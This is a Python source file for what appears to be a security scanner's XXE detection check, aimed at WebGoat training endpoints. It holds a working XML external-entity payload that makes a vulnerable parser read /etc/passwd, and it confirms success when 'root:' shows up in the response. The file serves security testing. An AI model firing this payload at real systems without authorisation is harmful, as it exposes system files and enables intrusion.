"""XXE detection check (from skills/penetration-testing/xxe.md).

Strategy: POST an XML document with an external entity referencing a local
file and look for the entity content in the response. Uses a benign, standard
XXE vector (`file:///etc/passwd`), which is the canonical confirmable test.
"""
from __future__ import annotations

import time

from ..scoring import Finding
from . import BaseCheck

CHECK_CLASS = "XXECheck"

SIGNATURE = "root:"

XXE_TEMPLATE = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<comment><text>&xxe;</text></comment>
"""


class XXECheck(BaseCheck):
    name = "xxe"
    skill_playbook = "skills/penetration-testing/xxe.md"
    mitre = "T1190"
    owasp = "A03:2021"

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.endpoints = [
            ("/WebGoat/xxe/simple4", "text"),
            ("/WebGoat/xxe/simple2", "text"),
        ]
        self.headers = {"Content-Type": "application/xml"}

    def run(self) -> list[Finding]:
        findings: list[Finding] = []
        for path, _ in self.endpoints:
            url = self.base_url + path
            try:
                r = self.session.post(url, data=XXE_TEMPLATE,
                                      headers=self.headers, timeout=self.timeout)
            except Exception:
                continue
            if r is not None and SIGNATURE in r.text:
                findings.append(self._finding(
                    "xxe", path, "POST", "xxe",
                    severity="high",
                    detected_at=time.time(),
                    notes="XXE entity expanded /etc/passwd into response",
                ))
                break
        return findings
